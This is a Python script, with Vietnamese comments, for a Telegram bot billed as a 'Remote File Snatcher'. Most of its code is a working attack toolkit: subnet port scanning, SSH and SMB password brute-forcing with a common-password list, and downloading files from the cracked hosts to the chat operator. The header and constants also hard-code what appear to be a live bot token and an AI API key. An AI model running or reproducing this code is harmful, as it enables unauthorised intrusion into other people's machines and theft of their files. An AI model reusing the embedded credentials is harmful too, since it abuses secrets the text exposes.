#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Bot Telegram - Remote File Snatcher + PDF Link + AI (Gemini)
# Token: 8702411893:AAELXd_JyPwmv9J9HFE1Z582Xsz9XEwexEY
# AI API Key (dạng AQ. mới): AQ.Ab8RN6ISJHt7Wz6UBTlF5MWeYTfZHDoBuCoyX0JsUx07cQgPAg

import os, sys, socket, ipaddress, tempfile, threading, time, asyncio, json, re, requests
try:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes
except ImportError:
    print("Cài: pip install python-telegram-bot")
    sys.exit(1)
try:
    import paramiko
except ImportError:
    paramiko = None
try:
    from impacket.smbconnection import SMBConnection
except ImportError:
    SMBConnection = None
try:
    import gdown
except ImportError:
    gdown = None

TOKEN = "8702411893:AAELXd_JyPwmv9J9HFE1Z582Xsz9XEwexEY"
AI_API_KEY = "AQ.Ab8RN6ISJHt7Wz6UBTlF5MWeYTfZHDoBuCoyX0JsUx07cQgPAg"
WORDLIST = ["admin","password","123456","root","user","test","guest","P@ssw0rd","password123"]
TIMEOUT = 2
SCAN_THREADS = 50
PDF_LINKS_FILE = "pdf_links.json"

def load_links():
    try:
        with open(PDF_LINKS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}
def save_links(links):
    with open(PDF_LINKS_FILE, 'w') as f:
        json.dump(links, f, indent=2)
pdf_links = load_links()

def download_from_link(link, local_path):
    if 'drive.google.com' in link:
        if gdown is None: return False
        try:
            gdown.download(link, local_path, quiet=False)
            return True
        except:
            return False
    else:
        try:
            r = requests.get(link, stream=True, timeout=30)
            if r.status_code == 200:
                with open(local_path, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=8192):
                        f.write(chunk)
                return True
            return False
        except:
            return False

def ask_gemini(prompt):
    url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"
    headers = {
        "Content-Type": "application/json",
        "x-goog-api-key": AI_API_KEY   # DÙNG HEADER NÀY CHO KEY DẠNG AQ.
    }
    payload = {
        "contents": [{"parts": [{"text": prompt}]}]
    }
    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=30)
        if resp.status_code == 200:
            data = resp.json()
            try:
                return data['candidates'][0]['content']['parts'][0]['text']
            except:
                return "Lỗi parse response từ AI."
        else:
            return f"Lỗi API ({resp.status_code}): {resp.text}"
    except Exception as e:
        return f"Lỗi kết nối AI: {e}"

def scan_ports(ip, ports):
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(TIMEOUT)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            s.close()
        except:
            pass
    return open_ports

def scan_subnet(subnet, ports=[22,445,3389,139]):
    results = []
    try:
        net = ipaddress.ip_network(subnet, strict=False)
        hosts = list(net.hosts())
        def worker(host):
            ip = str(host)
            p = scan_ports(ip, ports)
            if p:
                results.append((ip, p))
        threads = []
        for host in hosts:
            t = threading.Thread(target=worker, args=(host,))
            t.start()
            threads.append(t)
            if len(threads) >= SCAN_THREADS:
                for t in threads: t.join()
                threads = []
        for t in threads: t.join()
    except Exception as e:
        return str(e)
    return results

def brute_ssh(ip, username):
    if paramiko is None: return None
    for pwd in WORDLIST:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, username=username, password=pwd, timeout=TIMEOUT+1)
            client.close()
            return pwd
        except:
            continue
    return None

def get_file_ssh(ip, user, pwd, remote, local):
    if paramiko is None: return False
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=user, password=pwd, timeout=5)
        sftp = client.open_sftp()
        sftp.get(remote, local)
        sftp.close(); client.close()
        return True
    except:
        return False

def brute_smb(ip, username=""):
    if SMBConnection is None: return None
    users = [username] if username else ["", "guest", "admin", "Administrator"]
    for user in users:
        for pwd in WORDLIST:
            try:
                conn = SMBConnection(ip, ip, timeout=TIMEOUT)
                conn.login(user, pwd)
                conn.close()
                return (user, pwd)
            except:
                pass
    return None

def get_file_smb(ip, user, pwd, remote, local):
    if SMBConnection is None: return False
    try:
        conn = SMBConnection(ip, ip, timeout=TIMEOUT)
        conn.login(user, pwd)
        if remote.startswith('\\\\'):
            parts = remote[2:].split('\\', 1)
            share, path = parts[0], parts[1].replace('\\','/')
        else:
            parts = remote.split('/', 1)
            share, path = parts[0], parts[1] if len(parts)>1 else ''
        with open(local, 'wb') as f:
            conn.getFile(share, path, f.write)
        conn.close()
        return True
    except:
        return False


async def start(update, context):
    await update.message.reply_text(
        "🤖 Bot đa chức năng\n"
        "/scan <subnet>\n/brutessh <ip> <user>\n/getssh <ip> <user> <pass> <path>\n"
        "/brutesmb <ip>\n/getsmb <ip> <user> <pass> <share/path>\n"
        "/setpdf <tên> <link>\n/listpdf\n/getpdf <tên>\n"
        "/ai <câu hỏi> – Hỏi AI "
        "/help – trợ giúp"
    )

async def scan_cmd(update, context):
    args = context.args
    if not args:
        await update.message.reply_text("VD: /scan 192.168.1.0/24")
        return
    subnet = args[0]
    await update.message.reply_text(f"⏳ Đang quét {subnet}...")
    loop = asyncio.get_event_loop()
    res = await loop.run_in_executor(None, scan_subnet, subnet)
    if isinstance(res, str):
        await update.message.reply_text(f"Lỗi: {res}"); return
    if not res:
        await update.message.reply_text("Không tìm thấy.")
        return
    msg = "📡 Kết quả:\n"
    for ip, ports in res:
        msg += f"{ip} - Mở: {ports}\n"
        if len(msg) > 4000:
            await update.message.reply_text(msg); msg = ""
    if msg: await update.message.reply_text(msg)

async def brutessh_cmd(update, context):
    args = context.args
    if len(args)<2:
        await update.message.reply_text("Cú pháp: /brutessh <ip> <username>")
        return
    ip, user = args[0], args[1]
    await update.message.reply_text(f"⏳ Brute SSH {ip}:{user}...")
    loop = asyncio.get_event_loop()
    pwd = await loop.run_in_executor(None, brute_ssh, ip, user)
    if pwd:
        await update.message.reply_text(f"✅ Mật khẩu: `{pwd}`", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ Không tìm thấy.")

async def getssh_cmd(update, context):
    args = context.args
    if len(args)<4:
        await update.message.reply_text("Cú pháp: /getssh <ip> <user> <pass> <path>")
        return
    ip, user, pwd, remote = args[0], args[1], args[2], " ".join(args[3:])
    with tempfile.NamedTemporaryFile(delete=False, suffix='.download') as tmp:
        local = tmp.name
    await update.message.reply_text(f"⏳ Đang tải {remote}...")
    loop = asyncio.get_event_loop()
    ok = await loop.run_in_executor(None, get_file_ssh, ip, user, pwd, remote, local)
    if ok:
        with open(local, 'rb') as f:
            await update.message.reply_document(document=f, filename=os.path.basename(remote))
        os.unlink(local)
    else:
        await update.message.reply_text("❌ Tải thất bại.")
        if os.path.exists(local): os.unlink(local)

async def brutesmb_cmd(update, context):
    args = context.args
    if not args:
        await update.message.reply_text("Cú pháp: /brutesmb <ip>")
        return
    ip = args[0]
    await update.message.reply_text(f"⏳ Brute SMB {ip}...")
    loop = asyncio.get_event_loop()
    cred = await loop.run_in_executor(None, brute_smb, ip)
    if cred:
        user, pwd = cred
        await update.message.reply_text(f"✅ Tìm thấy: `{user}:{pwd}`", parse_mode="Markdown")
    else:
        await update.message.reply_text("❌ Không tìm thấy.")

async def getsmb_cmd(update, context):
    args = context.args
    if len(args)<4:
        await update.message.reply_text("Cú pháp: /getsmb <ip> <user> <pass> <share/path>")
        return
    ip, user, pwd, remote = args[0], args[1], args[2], " ".join(args[3:])
    with tempfile.NamedTemporaryFile(delete=False, suffix='.download') as tmp:
        local = tmp.name
    await update.message.reply_text(f"⏳ Đang tải {remote}...")
    loop = asyncio.get_event_loop()
    ok = await loop.run_in_executor(None, get_file_smb, ip, user, pwd, remote, local)
    if ok:
        with open(local, 'rb') as f:
            await update.message.reply_document(document=f, filename=os.path.basename(remote))
        os.unlink(local)
    else:
        await update.message.reply_text("❌ Tải thất bại.")
        if os.path.exists(local): os.unlink(local)

async def setpdf_cmd(update, context):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Cú pháp: /setpdf <tên> <link>")
        return
    name = args[0]
    link = " ".join(args[1:])
    if not link.startswith(('http://', 'https://')):
        await update.message.reply_text("❌ Link không hợp lệ.")
        return
    pdf_links[name] = link
    save_links(pdf_links)
    await update.message.reply_text(f"✅ Đã lưu PDF `{name}` với link:\n{link}", parse_mode="Markdown")

async def listpdf_cmd(update, context):
    if not pdf_links:
        await update.message.reply_text("📁 Chưa có PDF nào.")
        return
    msg = "📄 Danh sách PDF:\n" + "\n".join(f"• {name}" for name in pdf_links.keys())
    await update.message.reply_text(msg)

async def getpdf_cmd(update, context):
    args = context.args
    if not args:
        await update.message.reply_text("Cú pháp: /getpdf <tên>")
        return
    name = args[0]
    if name not in pdf_links:
        await update.message.reply_text(f"❌ Không tìm thấy `{name}`.")
        return
    link = pdf_links[name]
    await update.message.reply_text(f"⏳ Đang tải PDF...")
    with tempfile.NamedTemporaryFile(delete=False, suffix='.pdf') as tmp:
        local = tmp.name
    loop = asyncio.get_event_loop()
    ok = await loop.run_in_executor(None, download_from_link, link, local)
    if ok:
        try:
            with open(local, 'rb') as f:
                await update.message.reply_document(document=f, filename=f"{name}.pdf")
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi gửi: {e}")
        os.unlink(local)
    else:
        await update.message.reply_text("❌ Tải thất bại.")
        if os.path.exists(local): os.unlink(local)

async def ai_cmd(update, context):
    args = context.args
    if not args:
        await update.message.reply_text("Cú pháp: /ai <câu hỏi>")
        return
    prompt = " ".join(args)
    await update.message.reply_text("🤖 Đang suy nghĩ...")
    loop = asyncio.get_event_loop()
    reply = await loop.run_in_executor(None, ask_gemini, prompt)
    if len(reply) > 4096:
        reply = reply[:4090] + "...(cắt)"
    await update.message.reply_text(reply)

async def help_cmd(update, context):
    await start(update, context)


def main():
    if paramiko is None: print("⚠️ paramiko chưa cài")
    if SMBConnection is None: print("⚠️ impacket chưa cài")
    if gdown is None: print("⚠️ gdown chưa cài (Google Drive không hoạt động)")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("scan", scan_cmd))
    app.add_handler(CommandHandler("brutessh", brutessh_cmd))
    app.add_handler(CommandHandler("getssh", getssh_cmd))
    app.add_handler(CommandHandler("brutesmb", brutesmb_cmd))
    app.add_handler(CommandHandler("getsmb", getsmb_cmd))
    app.add_handler(CommandHandler("setpdf", setpdf_cmd))
    app.add_handler(CommandHandler("listpdf", listpdf_cmd))
    app.add_handler(CommandHandler("getpdf", getpdf_cmd))
    app.add_handler(CommandHandler("ai", ai_cmd))
    print("🤖 Bot đang chạy...")
    app.run_polling()

if __name__ == "__main__":
    main()
